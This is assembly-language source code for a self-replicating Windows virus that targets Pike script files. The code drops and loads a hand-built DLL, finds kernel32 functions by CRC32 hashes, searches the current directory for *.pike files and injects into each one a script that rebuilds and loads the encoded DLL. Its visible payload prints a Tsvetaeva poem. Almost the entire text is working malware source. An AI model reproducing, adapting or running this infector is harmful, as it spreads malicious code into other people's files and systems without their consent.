.386
.model  flat, stdcall
include noon.inc
.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

unit_code       label    near
        mov     esi, offset pike_module
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    CREATE_ALWAYS
        push    ebx
        push    FILE_SHARE_READ or FILE_SHARE_WRITE
        push    GENERIC_READ or GENERIC_WRITE
        push    esi
        call    CreateFile 
        push    eax
        push    ebx
        push    esp
        push    hPointerToRawData + hSizeOfRawData
        push    offset module_begin
        push    eax
        call    WriteFile
        call    CloseHandle
        push    esi
        call    LoadLibrary
        jmp     link_text

pike_module     label    near
        db      "h.h", 0

module_begin    label    near

;-------------------------------------------------------------------------------
;here begins Pike DLL module
;-------------------------------------------------------------------------------

        db      "MZ"                                                               ;IMAGE_DOS_HEADER.e_magic
        dw      0                                                                  ;IMAGE_DOS_HEADER.e_cblp
        dw      0                                                                  ;IMAGE_DOS_HEADER.e_cp
        dw      0                                                                  ;IMAGE_DOS_HEADER.e_crlc
        dw      0                                                                  ;IMAGE_DOS_HEADER.e_cparhdr
        dw      0                                                                  ;IMAGE_DOS_HEADER.e_minalloc
        db      "PE", 0, 0                                                         ;IMAGE_NT_HEADERS.FileHeader.Signature
        dw      IMAGE_FILE_MACHINE_I386                                            ;IMAGE_NT_HEADERS.FileHeader.Machine
        dw      1                                                                  ;IMAGE_NT_HEADERS.FileHeader.NumberOfSections
        dd      0                                                                  ;IMAGE_NT_HEADERS.FileHeader.TimeDateStamp
        dd      0                                                                  ;IMAGE_NT_HEADERS.FileHeader.PointerToSymbolTable
        dd      0                                                                  ;IMAGE_NT_HEADERS.FileHeader.NumberOfSymbols
        dw      68h                                                                ;IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
        dw      IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_DLL                      ;IMAGE_NT_HEADERS.FileHeader.Characteristics
        dw      IMAGE_NT_OPTIONAL_HDR32_MAGIC                                      ;IMAGE_NT_HEADERS.OptionalHeader.Magic
        db      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MajorLinkerVersion
        db      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MinorLinkerVersion
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfCode
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfInitializedData
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfUninitializedData
        dd      (offset unit_begin - offset export_table) + hVirtualAddress        ;IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.BaseOfCode
        dd      0ch                                                                ;IMAGE_NT_HEADERS.OptionalHeader.BaseOfData and IMAGE_DOS_HEADER.e_lfanew
        dd      10000000h                                                          ;IMAGE_NT_HEADERS.OptionalHeader.ImageBase
        dd      1000h                                                              ;IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
        dd      200h                                                               ;IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MajorOperatingSystemVersion
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MinorOperatingSystemVersion
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MajorImageVersion
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MinorImageVersion
        dw      4                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MajorSubsystemVersion
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.MinorSubsystemVersion
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.Win32VersionValue
        dd      hVirtualAddress + hVirtualSize                                     ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
        dd      hSizeOfHeaders                                                     ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.CheckSum
        dw      IMAGE_SUBSYSTEM_WINDOWS_CUI                                        ;IMAGE_NT_HEADERS.OptionalHeader.Subsystem
        dw      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics
        dd      100000h                                                            ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfStackReserve
        dd      1000h                                                              ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfStackCommit
        dd      100000h                                                            ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeapReserve
        dd      1000h                                                              ;IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeapCommit
        dd      0                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.LoaderFlags
        dd      2                                                                  ;IMAGE_NT_HEADERS.OptionalHeader.NumberOfRvaAndSizes
        dd      hVirtualAddress                                                    ;Export Table Rva
        dd      0                                                                  ;Export Table Size
        db      8 dup (0)                                                          ;IMAGE_SECTION_HEADER.Name
        dd      hVirtualSize                                                       ;IMAGE_SECTION_HEADER.VirtualSize
        dd      hVirtualAddress                                                    ;IMAGE_SECTION_HEADER.VirtualAddress
        dd      hSizeOfRawData                                                     ;IMAGE_SECTION_HEADER.SizeOfRawData
        dd      hPointerToRawData                                                  ;IMAGE_SECTION_HEADER.PointerToRawData
        dd      0                                                                  ;IMAGE_SECTION_HEADER.PointerToRelocations
        dd      0                                                                  ;IMAGE_SECTION_HEADER.PointerToLineNumbers
        dw      0                                                                  ;IMAGE_SECTION_HEADER.NumberOfRelocations
        dw      0                                                                  ;IMAGE_SECTION_HEADER.NumberOfLineNumbers
        dd      IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_EXECUTE ;IMAGE_SECTION_HEADER.Characteristics

headers_end     label    near
        db      hSizeOfHeaders - (offset headers_end - offset module_begin) dup (0)

export_table    label    near
        dd      (offset export_name2 - offset export_table) + hVirtualAddress      ;IMAGE_EXPORT_DIRECTORY.Characteristics
        dd      (offset export_name - offset export_table) + hVirtualAddress       ;IMAGE_EXPORT_DIRECTORY.TimeDateStamp
        dw      0                                                                  ;IMAGE_EXPORT_DIRECTORY.MajorVersion
        dw      0                                                                  ;IMAGE_EXPORT_DIRECTORY.MinorVersion
        dd      0                                                                  ;IMAGE_EXPORT_DIRECTORY.Name

ordinal_table   label    near
        dd      1                                                                  ;IMAGE_EXPORT_DIRECTORY.Base
        dd      2                                                                  ;IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
        dd      2                                                                  ;IMAGE_EXPORT_DIRECTORY.NumberOfNames
        dd      (offset address_table - offset export_table) + hVirtualAddress     ;IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
        dd      hVirtualAddress                                                    ;IMAGE_EXPORT_DIRECTORY.AddressOfNames
        dd      (offset ordinal_table - offset export_table) + hVirtualAddress     ;IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals

address_table   label    near
        dd      (offset module_exit - offset export_table) + hVirtualAddress
        dd      (offset module_init - offset export_table) + hVirtualAddress

export_name     label    near
        db      "pike_module_init", 0

export_name2    label    near
        db      "pike_module_exit", 0

unit_begin      label    near

;-------------------------------------------------------------------------------
;here begins code in Pike module
;-------------------------------------------------------------------------------

        pop     eax
        pop     ecx
        pop     edx
        dec     edx                          ;sets ZF if DLL_PROCESS_ATTACH
        pop     edx
        push    eax
        jnz     branch_ret
        pushad                               ;now we can use non-volatile registers
        call    init_mainseh

delta_frseh     label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        
branch_ret      label    near
        push    1
        pop     eax                          ;must return TRUE for the script to run

module_init     label    near                ;pike_module_init()
module_exit     label    near                ;pike_module_exit()
        ret

encoder         label    near
        mov     al, byte ptr [esi]
        shr     al, 4
        call    hex2str
        lods    byte ptr [esi]
        and     al, 0fh
        call    hex2str
        loop    encoder
        ret

hex2str         label    near
        cmp     al, 0ah
        sbb     al, 69h
        das
        stos    byte ptr [edi]
        ret

script_body2    label    near

;-------------------------------------------------------------------------------
;this piece of script is inserted after the encoded body of the DLL
;-------------------------------------------------------------------------------

        db      '"));h.close();load_module("./h.h");}//', 0, 0ah

script_b2end    label    near

;-------------------------------------------------------------------------------
;CRC32 list of API names
;-------------------------------------------------------------------------------

        dd      0b09315f4h                   ;CloseHandle
        dd      0553b5c78h                   ;CreateFileA
        dd      0d82bf69ah                   ;FindClose
        dd      0c9ebd5ceh                   ;FindFirstFileA
        dd      075272948h                   ;FindNextFileA
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      0095c03d0h                   ;ReadFile
        dd      0efc7ea74h                   ;SetFilePointer
        dd      0cce95612h                   ;WriteFile
        db      "*.pike", 0

init_mainseh    label    near

;-------------------------------------------------------------------------------
;retrieve kernel32 base address and API addresses
;-------------------------------------------------------------------------------

        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr fs:[edx + 30h]
        mov     eax, dword ptr [eax + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    eax, esi
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        lea     eax, dword ptr [ecx + hVirtualAddress + (offset script_begin - offset export_table)]
        mov     dword ptr [ecx + hVirtualAddress + (offset scriptcfg - offset export_table) - 4], eax
        lea     edi, dword ptr [eax + (offset script_strdll - offset script_begin)]
        mov     esi, ecx
        xor     ecx, ecx
        mov     ch, high hSizeOfHeaders
        call    encoder
        mov     si, hVirtualAddress
        mov     ch, high hSizeOfRawData
        call    encoder
        mov     si, hVirtualAddress + offset script_body2 - offset export_table
        mov     cl, offset script_b2end - offset script_body2
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        pushad
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32l1         label    near
        xor     al, byte ptr [edi]
        mov     cl, 8

crc32l2         label    near
        shr     eax, 1
        jnc     crc32l3
        xor     eax, 0edb88320h

crc32l3         label    near
        loop    crc32l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32l1
        not     eax
        cmp     dword ptr [esi], eax
        popad
        jne     walk_names
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        movzx   edi, word ptr [edi + edx * 2]
        push    dword ptr [eax + edi * 4]
        add     dword ptr [esp], ebp
        lods    dword ptr [esi]
        cmp     al, 12h
        jnz     walk_names

;-------------------------------------------------------------------------------
;find Pike files in the current directory
;-------------------------------------------------------------------------------

        enter   sizeof WIN32_FIND_DATA + sizeof IMAGE_DOS_HEADER.e_magic, 0
        push    esp
        push    esi
        call    dword ptr [ebp + mapStack.kFindFirstFileA + sizeof mapStack.kSetFilePointer]
        mov     esi, esp
        xchg    edi, eax
        xor     ebx, ebx

find_next       label    near
        pushad
        push    ebx
        push    ebx
        push    3                            ;OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        lea     ecx, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        push    ecx
        call    dword ptr [ebp + mapStack.kCreateFileA + sizeof mapStack.kSetFilePointer]
        inc     eax
        jz      skip_file
        push    eax
        xchg    edi, eax
        mov     esi, dword ptr [esi + WIN32_FIND_DATA.nFileSizeLow]
        push    esi
        push    GMEM_ZEROINIT
        call    dword ptr [ebp + mapStack.kGlobalAlloc + sizeof mapStack.kSetFilePointer]
        push    eax
        pushad
        call    infect_pike
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + mapStack.kGlobalFree + sizeof mapStack.kSetFilePointer]
        call    dword ptr [ebp + mapStack.kCloseHandle + sizeof mapStack.kSetFilePointer]

skip_file       label    near
        popad
        push    esi
        push    edi
        call    dword ptr [ebp + mapStack.kFindNextFileA + sizeof mapStack.kSetFilePointer]
        dec     eax
        jz      find_next
        push    edi
        call    dword ptr [ebp + mapStack.kFindClose + sizeof mapStack.kSetFilePointer]

branch_int3     label    near

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

        int     3

infect_pike     label    near

;-------------------------------------------------------------------------------
;infect Pike file
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        push    eax
        push    esi
        push    esi
        push    ebx
        push    esp
        push    esi
        push    eax
        xchg    esi, eax
        push    edi
        call    dword ptr [ebp + mapStack.kReadFile + sizeof mapStack.kCreateFileA]
        pop     ecx
        cdq

find_null       label    near
        lods    byte ptr [esi]
        sub     eax, ebx
        jz      branch_int3
        cmp     al, "{"
        jne     branch_loop
        mov     edx, esi

branch_loop     label    near
        loop    find_null
        pop     ecx
        pop     eax 
        sub     edx, eax
        js      branch_int3
        sub     ecx, edx
        add     eax, edx
        push    ebx                          ;WriteFile
        push    esp                          ;WriteFile
        push    ecx                          ;WriteFile
        push    eax                          ;WriteFile
        push    edi                          ;WriteFile
        neg     ecx
        push    FILE_END
        push    ebx
        push    ecx
        push    edi
        call    dword ptr [ebp + mapStack.kSetFilePointer + sizeof mapStack.kCreateFileA]
        push    ebx
        push    esp
        push    (offset script_end - offset script_begin) + (offset script_b2end - offset script_body2)
        push    "hh86"

scriptcfg       label    near
        push    edi
        call    dword ptr [ebp + mapStack.kWriteFile + sizeof mapStack.kCreateFileA]
        call    dword ptr [ebp + mapStack.kWriteFile + sizeof mapStack.kCreateFileA]
        int     3

script_begin    label    near
        db      'Stdio.File h=Stdio.File();if(h.open("h.h","ctw")){h.write(String.hex2string("'

script_strdll   label    near
        db      (hSizeOfHeaders + hSizeOfRawData) shl 1 dup (0)

script_end      label    near
        db      1000h dup (0)

unit_end        label    near

end     unit_code